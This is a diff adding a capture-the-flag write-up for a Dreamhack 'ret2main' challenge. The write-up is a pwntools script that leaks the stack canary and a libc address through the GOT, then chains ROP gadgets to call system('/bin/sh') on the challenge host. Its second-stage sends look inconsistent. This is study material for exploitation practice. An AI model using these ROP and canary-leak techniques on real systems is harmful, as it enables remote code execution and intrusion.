@@ -207,3 +207,66 @@ p.interactive()
 
 <img width="536" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/4cb122c9-2905-48a5-bf6a-3335c53c839b">
 <img width="537" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/d51a5160-7c4f-4a10-85c4-ba4fc5ce7288">
+
+# ret2main 풀이
+```
+from pwn import *
+
+context.arch = "amd64"
+p = remote('host3.dreamhack.games', 13886)
+
+e = ELF('./rop')
+libc = ELF('./libc.so.6')
+
+read_got = e.got['read']
+write_plt = e.plt['write']
+main = e.symbols['main']
+
+read_system_offset = libc.symbols['read'] - libc.symbols['system']
+read_binsh_offset = libc.symbols['read'] - list(libc.search(b'/bin/sh'))[0]
+
+r = ROP(e)
+
+pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+ret = r.find_gadget(['ret'])[0]
+
+p.sendafter(b'Buf: ', b'a'*0x39)
+p.recvuntil(b'a'*0x39)
+canary = b'\x00' + p.recvn(7)
+
+payload = b'a'*0x38 + canary + b'a'*0x8
+
+payload += p64(ret)
+
+# first main
+
+# write(1, read_got, ...)
+
+payload += p64(pop_rdi) + p64(0x1)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
+payload += p64(write_plt)
+
+# 여기서는 위와 달리 read_got를 읽어오고 받아온 값을 저장 후, 다시 위처럼 read 함수를 호출하여 저장한 입력값을 보내는 풀이가 아니기 때문에 system 콜을 직접적으로 하려면 main으로 다시 돌아가서 main 함수의 read 콜에 새로 입력을 해야함
+
+payload += p64(main)
+
+p.sendafter(b'Buf: ', payload)
+
+read = p.recvn(6) + b'\x00'*0x2
+system = u64(read) - read_system_offset
+binsh = u64(read) - read_binsh_offset
+
+# second main
+
+payload = b'a'*0x38 + canary + b'a'*0x8
+
+p.sendafter(b'Buf: ', payload)
+
+payload += p64(ret)
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(system)
+
+p.send(payload)
+p.interactive()
+```
